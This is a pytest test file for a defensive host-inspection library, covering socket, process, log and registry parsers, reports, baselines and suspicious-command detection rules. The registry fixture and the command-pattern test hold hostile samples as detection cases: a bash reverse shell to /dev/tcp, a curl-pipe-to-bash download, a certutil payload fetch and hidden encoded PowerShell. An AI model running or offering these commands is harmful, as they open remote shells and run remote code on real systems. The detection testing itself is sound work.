import argparse
import json
import os
import re
import sys
from datetime import datetime

import pytest

import btcommon
from btcommon import (
    EXIT_CLEAN,
    EXIT_ERROR,
    EXIT_FINDINGS,
    Report,
    diff_items,
    fmt_endpoint,
    load_baseline,
    parse_log_time,
    parse_netstat_linux,
    parse_netstat_windows,
    parse_ps,
    parse_reg_query,
    parse_ss,
    run,
    save_baseline,
    split_host_port,
)


def args(**kw):
    defaults = {"json": False, "min_severity": "info", "rules": None}
    defaults.update(kw)
    return argparse.Namespace(**defaults)


# --- run() -------------------------------------------------------------------


def test_run_missing_binary_does_not_raise():
    result = run(["definitely-not-a-real-binary-xyz"])
    assert not result.ok
    assert "not found" in result.stderr


def test_run_timeout_does_not_raise():
    result = run([sys.executable, "-c", "import time; time.sleep(5)"], timeout=1)
    assert not result.ok
    assert "timed out" in result.stderr


# --- sockets ---------------------------------------------------------------------

SS_OUTPUT = """\
tcp   ESTAB  0      0      172.24.108.255:49870    35.190.46.17:443   users:(("node",pid=2138,fd=21))
tcp   LISTEN 0      511    *:4100                  *:*                users:(("node",pid=2138,fd=19))
udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*
tcp   LISTEN 0      128    [::1]:631               [::]:*
tcp   ESTAB  0      0      [fe80::1%eth0]:22       [fe80::2%eth0]:51000
"""


def test_parse_ss_uses_peer_column_not_recv_q():
    # Regression: the old network_beacon_watch read Recv-Q ("0") as the destination.
    sockets = parse_ss(SS_OUTPUT)
    first = sockets[0]
    assert (first.remote_addr, first.remote_port) == ("35.190.46.17", 443)
    assert (first.pid, first.process) == (2138, "node")
    assert sockets[1].listening and sockets[1].local_port == 4100
    assert sockets[2].local_addr == "127.0.0.53" and sockets[2].listening
    assert sockets[3].local_addr == "::1"
    assert sockets[4].local_addr == "fe80::1"


NETSTAT_WINDOWS = """\
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1044
  TCP    192.168.1.10:50123     52.97.1.1:443          ESTABLISHED     4321
  TCP    [::]:445               [::]:0                 LISTENING       4
  UDP    0.0.0.0:500            *:*                                    3100
  UDP    [::1]:1900             *:*                                    5000
"""


def test_parse_netstat_windows_udp_has_no_state():
    sockets = parse_netstat_windows(NETSTAT_WINDOWS)
    assert len(sockets) == 5
    est = sockets[1]
    assert (est.remote_addr, est.remote_port, est.state, est.pid) == ("52.97.1.1", 443, "ESTABLISHED", 4321)
    udp = sockets[3]
    # Regression: the old parser returned the *local* address for UDP rows.
    assert udp.proto == "udp" and udp.local_port == 500 and udp.remote_addr == "*" and udp.pid == 3100
    assert udp.listening
    assert sockets[2].local_addr == "::"


NETSTAT_LINUX = """\
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      812/sshd
tcp        0      0 10.0.0.5:22             10.0.0.9:51514          ESTABLISHED 999/sshd: bob
udp        0      0 0.0.0.0:68              0.0.0.0:*                           456/dhclient
tcp6       0      0 :::80                   :::*                    LISTEN      -
"""


def test_parse_netstat_linux():
    sockets = parse_netstat_linux(NETSTAT_LINUX)
    assert [s.state for s in sockets] == ["LISTEN", "ESTABLISHED", "", "LISTEN"]
    assert sockets[0].process == "sshd" and sockets[0].pid == 812
    assert sockets[2].pid == 456 and sockets[2].listening
    assert sockets[3].local_addr == "::" and sockets[3].local_port == 80 and sockets[3].pid is None


@pytest.mark.parametrize(
    "value,expected",
    [
        ("1.2.3.4:80", ("1.2.3.4", 80)),
        ("[::1]:631", ("::1", 631)),
        ("*:68", ("*", 68)),
        ("0.0.0.0:*", ("0.0.0.0", None)),
        (":::22", ("::", 22)),
        ("::ffff:10.0.0.1:443", ("::ffff:10.0.0.1", 443)),
        ("10.0.0.1%eth0:5353", ("10.0.0.1", 5353)),
    ],
)
def test_split_host_port(value, expected):
    assert split_host_port(value) == expected


def test_fmt_endpoint_brackets_ipv6():
    assert fmt_endpoint("::1", 22) == "[::1]:22"
    assert fmt_endpoint("1.2.3.4", None) == "1.2.3.4:*"


def test_camel_to_state():
    assert btcommon._camel_to_state("TimeWait") == "TIME_WAIT"
    assert btcommon._camel_to_state("Listen") == "LISTEN"


# --- processes -----------------------------------------------------------------


def test_parse_ps_keeps_spaces_in_arguments(monkeypatch):
    monkeypatch.setattr(btcommon, "IS_LINUX", False)
    output = "  123     1 alice                        0.5  1.2 /usr/lib/firefox/firefox -contentproc Web Content\n"
    (proc,) = parse_ps(output)
    assert proc.pid == 123 and proc.ppid == 1 and proc.user == "alice"
    assert proc.cmdline.endswith("Web Content")
    assert proc.name == "firefox" and proc.cpu == 0.5


# --- logs ----------------------------------------------------------------------


def test_parse_log_time_formats():
    now = datetime(2026, 1, 5, 12, 0, 0)
    assert parse_log_time("Jan  5 10:00:00 host sshd[1]: x", now) == datetime(2026, 1, 5, 10, 0, 0)
    # A December line read in January belongs to the previous year.
    assert parse_log_time("Dec 31 23:00:00 host sshd[1]: x", now).year == 2025
    assert parse_log_time("2026-01-05T10:00:00 host x", now) == datetime(2026, 1, 5, 10, 0, 0)
    assert parse_log_time("2026-01-05T10:00:00.123+00:00 host x", now) is not None
    assert parse_log_time("garbage", now) is None


# --- registry ------------------------------------------------------------------

REG_OUTPUT = """\

HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\\system32\\SecurityHealthSystray.exe
    Evil Updater    REG_SZ    powershell -w hidden -enc AAAA
    (Default)    REG_SZ

HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Sub
    X    REG_DWORD    0x1
"""


def test_parse_reg_query():
    keys = parse_reg_query(REG_OUTPUT)
    run_key = keys["HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"]
    assert run_key["Evil Updater"] == "powershell -w hidden -enc AAAA"
    assert run_key["(Default)"] == ""
    assert keys["HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Sub"]["X"] == "0x1"


# --- reports and baselines -----------------------------------------------------


def test_report_exit_codes(capsys):
    report = Report("t", args())
    report.info("c", "inventory only")
    assert report.exit_code() == EXIT_CLEAN
    report.add("c", "low", "something")
    assert report.exit_code() == EXIT_FINDINGS
    report.fail("broken")
    assert report.exit_code() == EXIT_ERROR


def test_report_json_and_min_severity(capsys):
    report = Report("t", args(json=True, min_severity="medium"))
    report.info("c", "hidden")
    report.add("c", "high", "shown", key="v", empty="")
    assert report.emit() == EXIT_FINDINGS
    doc = json.loads(capsys.readouterr().out)
    assert [f["message"] for f in doc["findings"]] == ["shown"]
    assert doc["findings"][0]["data"] == {"key": "v"}
    assert doc["summary"]["info"] == 1


def test_report_rejects_unknown_severity():
    with pytest.raises(ValueError):
        Report("t", args()).add("c", "critical", "x")


def test_baseline_roundtrip_and_v1_formats(tmp_path):
    path = tmp_path / "b.json"
    save_baseline(str(path), "t", {"a": "1"})
    assert load_baseline(str(path)) == {"a": "1"}
    v1_list = tmp_path / "v1.json"
    v1_list.write_text(json.dumps(["x", "y"]))
    assert load_baseline(str(v1_list)) == {"x": "", "y": ""}
    v1_hash = tmp_path / "h.json"
    v1_hash.write_text(json.dumps({"/etc/passwd": "abc"}))
    assert load_baseline(str(v1_hash)) == {"/etc/passwd": "abc"}


def test_diff_items():
    added, removed, changed = diff_items({"a": 1, "b": 2}, {"b": 3, "c": 4})
    assert (added, removed, changed) == (["c"], ["a"], ["b"])


@pytest.mark.skipif(os.name != "posix", reason="POSIX permissions")
def test_walk_files_records_unreadable_dirs(tmp_path):
    (tmp_path / "ok").mkdir()
    (tmp_path / "ok" / "f").write_text("x")
    locked = tmp_path / "locked"
    locked.mkdir()
    (locked / "g").write_text("y")
    locked.chmod(0)
    try:
        errors = []
        files = list(btcommon.walk_files([tmp_path], errors))
        assert tmp_path / "ok" / "f" in files
        if not btcommon.is_admin():
            assert errors
    finally:
        locked.chmod(0o755)


# --- rules -----------------------------------------------------------------------


def test_rules_file_regexes_compile():
    rules = json.loads(btcommon.RULES_PATH.read_text())
    patterns = (
        rules["commands"]["patterns"]
        + rules["deleted_binary_check"]["suspicious_dirs"]
        + rules["powershell_logging_audit"]["suspicious_patterns"]
        + rules["log_triage"]["linux_ignore"]
        + [m["pattern"] for m in rules["suspicious_web_root_scan"]["markers"]]
        + [p["pattern"] for p in rules["log_triage"]["linux_patterns"]]
    )
    for pattern in patterns:
        re.compile(pattern)


@pytest.mark.parametrize(
    "cmd,suspicious",
    [
        ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", True),
        ("curl -s http://x.example/a.sh | bash", True),
        ("powershell.exe -nop -w hidden -enc SQBFAFgA", True),
        ("certutil -urlcache -split -f http://x/a.exe a.exe", True),
        ("sh -c /tmp/.x/payload", True),
        ("python3 -c 'import socket,subprocess,os'", True),
        ("rsync -a /src /dst", False),
        ("/usr/sbin/sshd -D", False),
        ("sort -o /tmp/out.txt input.txt", False),
        ("bash -c 'pwd -P >| /tmp/claude-1000/cwd'", False),
        ("/usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown", False),
    ],
)
def test_command_patterns(cmd, suspicious):
    patterns = btcommon.compile_patterns(btcommon.load_rules("commands")["patterns"])
    assert (btcommon.first_match(cmd, patterns) is not None) == suspicious
